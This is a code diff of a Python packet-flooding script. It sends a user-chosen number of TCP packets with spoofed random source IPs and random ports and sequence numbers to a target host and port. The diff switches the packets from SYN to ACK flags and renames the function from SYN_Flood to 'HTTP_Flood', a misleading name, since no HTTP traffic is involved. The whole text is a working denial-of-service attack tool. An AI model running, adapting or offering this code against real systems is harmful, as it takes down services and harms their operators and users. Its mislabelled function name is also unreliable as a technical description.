@@ -12,14 +12,13 @@ def randInt():
 	return x
 
 
-def SYN_Flood(dstIP,dstPort,counter):
+def HTTP_Flood(dstIP,dstPort,counter):
 	total = 0
 	print ("Packets are sending ...")
 
 	for x in range (0,counter):
 		s_port = randInt()
 		s_eq = randInt()
-		w_indow = randInt()
 
 		IP_Packet = IP ()
 		IP_Packet.src = randomIP()
@@ -28,11 +27,10 @@ def SYN_Flood(dstIP,dstPort,counter):
 		TCP_Packet = TCP ()
 		TCP_Packet.sport = s_port
 		TCP_Packet.dport = dstPort
-		TCP_Packet.flags = "S"
+		TCP_Packet.flags = "A"
 		TCP_Packet.seq = s_eq
-		TCP_Packet.window = w_indow
 
-		send(IP_Packet/TCP_Packet, verbose=0)
+		send(IP_Packet/TCP_Packet)
 		total+=1
 
 	print("\nTotal packets sent: %i\n" % total)
@@ -49,6 +47,6 @@ def info():
 def main():
 	dstIP,dstPort = info()
 	counter = input ("How many packets do you want to send : ")
-	SYN_Flood(dstIP,dstPort,int(counter))
+	HTTP_Flood(dstIP,dstPort,int(counter))
 
 main()
